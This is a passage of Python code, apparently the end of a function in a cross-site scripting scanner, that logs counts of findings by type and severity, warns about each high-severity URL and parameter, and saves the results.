    log.info(f"[XSS] Total findings:   {len(result.findings)}")
    log.info(f"[XSS] Confirmed XSS:    {result.confirmed_count}")
    log.info(f"[XSS] High+:            {len(result.high_and_above)}")
    log.info(f"[XSS] DOM findings:     {len(result.dom_findings)}")

    if result.high_and_above:
        log.warning(f"[XSS] ★ HIGH/CRITICAL findings: {len(result.high_and_above)}")
        for f in result.high_and_above:
            log.warning(
                f"  → [{f.severity.value}] [{f.method}] "
                f"{f.url} ?{f.parameter}"
            )

    _save_results(result)
    return result